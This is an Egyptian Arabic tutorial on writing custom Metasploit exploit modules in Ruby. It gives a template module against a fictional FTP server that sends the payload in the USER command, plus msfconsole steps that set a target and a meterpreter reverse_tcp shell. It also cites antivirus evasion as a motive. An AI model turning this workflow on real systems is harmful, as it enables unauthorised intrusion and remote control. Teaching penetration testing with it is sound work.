## **🔥 تقنيات متقدمة في Metasploit: كتابة Exploits مخصصة 🔥**

### **🔹 يعني إيه نكتب Exploit مخصص؟**

الـ `Exploit` هو **كود استغلال** بيستفيد من ثغرة في نظام أو برنامج معين علشان نقدر نتحكم فيه. أحيانًا، الأدوات الجاهزة في `Metasploit` **مش بتكون كافية**، فبالتالي بنحتاج نكتب **Exploit مخصص** بنفسنا عشان يناسب الهدف.

✅ **ليه ممكن تحتاج تكتب Exploit بنفسك؟**

- لما تلاقي **ثغرة جديدة** مش موجودة في Metasploit.
- لما يكون **الـ Exploit الجاهز مش شغال** على الهدف بتاعك.
- لما تكون عايز **تحسن أداء Exploit معين أو تخفيه عن الـ Antivirus**.

🎯 **💬 الخلاصة بالمصري:**  
"لو Metasploit مش عنده Exploit يشتغل على الهدف، لازم تكتب واحد بنفسك عشان تستغل الثغرة!" 🚀😏

---

## **🟢 1. فهم بنية Exploit في Metasploit**

📌 أي `Exploit` في `Metasploit` بيتكون من **4 أجزاء رئيسية**:

1. **Module Info**: بيانات تعريف الـ Exploit (الاسم، الوصف، الهدف…).
2. **Check Function**: بيحدد إذا كان الهدف مصاب بالثغرة ولا لأ.
3. **Payload Delivery**: طريقة تنفيذ الكود الضار على الهدف.
4. **Exploit Execution**: الكود اللي بينفذ الثغرة فعليًا.

🎯 **💬 الخلاصة بالمصري:**  
"أي Exploit لازم يكون فيه بيانات، طريقة فحص، تنفيذ الكود، وإرسال البايلود!" 📝💣

---

## **🟢 2. إنشاء Exploit مخصص في Metasploit**

📌 **مثال عملي:** هنكتب Exploit بسيط يستغل ثغرة في `FTP Server` وهمي.

1️⃣ **افتح محرر النصوص واكتب الـ Exploit**

```ruby
# -*- coding: binary -*-
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom FTP Exploit',
      'Description'    => 'Exploit ثغرة وهمية في سيرفر FTP',
      'Author'         => ['YourName'],
      'License'        => MSF_LICENSE,
      'Payload'        => { 'Space' => 1000 },
      'Targets'        => [['Universal', {}]],
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(21)
      ])
  end

  def check
    connect
    sock.put("USER anonymous\r\n")
    res = sock.get
    disconnect

    if res && res.include?("220")
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    connect
    sock.put("USER " + payload.encoded + "\r\n")
    disconnect
  end
end
```

---

## **🟢 3. حفظ وتشغيل الـ Exploit في Metasploit**

📌 **لحفظ الـ Exploit في Metasploit:**

1. احفظه في المسار:
    
    ```bash
    ~/.msf4/modules/exploits/custom_ftp.rb
    ```
    
2. شغل `Metasploit` واكتب:
    
    ```bash
    msfconsole
    reload_all
    use exploit/custom_ftp
    set RHOST <target_ip>
    set PAYLOAD windows/meterpreter/reverse_tcp
    exploit
    ```
    

🎯 **💬 الخلاصة بالمصري:**  
"بنكتب Exploit بلغة Ruby، نحفظه في مسار Metasploit، وبعد كده نشغله بالـ msfconsole!" 🏴‍☠️🔥

---

## **🛠️ خطوات عملية لكتابة Exploit مخصص في Metasploit**

✅ **1. حدد الثغرة** اللي عايز تستغلها (ابحث عن CVEs أو حلل البرنامج بنفسك).  
✅ **2. استخدم Ruby** لكتابة الـ Exploit الخاص بيك وحفظه في مسار `Metasploit`.  
✅ **3. أضف طريقة تحقق (Check Function)** عشان تعرف الهدف مصاب بالثغرة ولا لأ.  
✅ **4. أضف طريقة استغلال (Exploit Function)** عشان ترسل الـ Payload المناسب.  
✅ **5. احفظ الكود وشغل Metasploit**، وبعدها جرب تشغيل الـ Exploit على الهدف.

🎯 **💬 الخلاصة النهائية بالمصري:**  
"لما الـ Exploits الجاهزة مش تنفع، بنكتب واحد بنفسنا بلغة Ruby، نحطه في Metasploit، ونجربه على الهدف!" 🤖💥